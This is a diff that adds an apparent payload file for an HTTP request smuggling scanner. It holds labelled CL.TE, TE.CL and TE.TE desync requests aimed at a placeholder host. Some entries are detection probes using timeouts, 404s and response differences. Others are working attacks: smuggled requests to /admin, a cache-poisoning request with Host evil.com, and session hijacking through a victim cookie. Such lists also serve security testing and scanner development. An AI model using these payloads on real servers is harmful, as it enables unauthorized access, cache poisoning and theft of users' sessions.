@@ -1,0 +1,147 @@
+# CL.TE (Content-Length to Transfer-Encoding desync)
+# Front-end uses Content-Length, back-end uses Transfer-Encoding
+CL.TE:GPOST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+
+# CL.TE with smuggled request
+CL.TE:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-Ignore: X
+
+# TE.CL (Transfer-Encoding to Content-Length desync)
+# Front-end uses Transfer-Encoding, back-end uses Content-Length
+TE.CL:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+GPOST / HTTP/1.1
+Content-Length: 15
+
+x=1
+0
+
+
+# TE.CL with admin request smuggling
+TE.CL:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 15
+
+x=1
+0
+
+
+# TE.TE (Transfer-Encoding duplication/obfuscation)
+# Both use Transfer-Encoding but can be obfuscated
+TE.TE:POST / HTTP/1.1
+Host: REPLACED_HOST
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+
+5
+GPOST
+0
+
+
+# TE.TE with obfuscated TE header
+TE.TE:POST / HTTP/1.1
+Host: REPLACED_HOST
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+5
+GPOST
+0
+
+
+# TE.TE with spaces in TE header
+TE.TE:POST / HTTP/1.1
+Host: REPLACED_HOST
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+
+5
+GPOST
+0
+
+
+# Time-based detection payload (causes delay if vulnerable)
+CL.TE:TIMEOUT:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+
+# Smuggled request to trigger 404
+CL.TE:404:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 49
+Transfer-Encoding: chunked
+
+0
+
+GET /smuggled404notfound HTTP/1.1
+X-Ignore: X
+
+# Differential response detection
+TE.CL:DIFF:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 4
+Transfer-Encoding: chunked
+
+60
+POST /different HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 10
+
+x=1
+0
+
+
+# Cache poisoning via smuggling
+CL.TE:CACHE:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 70
+Transfer-Encoding: chunked
+
+0
+
+GET / HTTP/1.1
+Host: evil.com
+X-Cache-Poison: true
+X-Ignore: X
+
+# Session hijacking via smuggling
+CL.TE:SESSION:POST / HTTP/1.1
+Host: REPLACED_HOST
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+GET /myaccount HTTP/1.1
+Host: REPLACED_HOST
+Cookie: victim_session
+X-Ignore: X
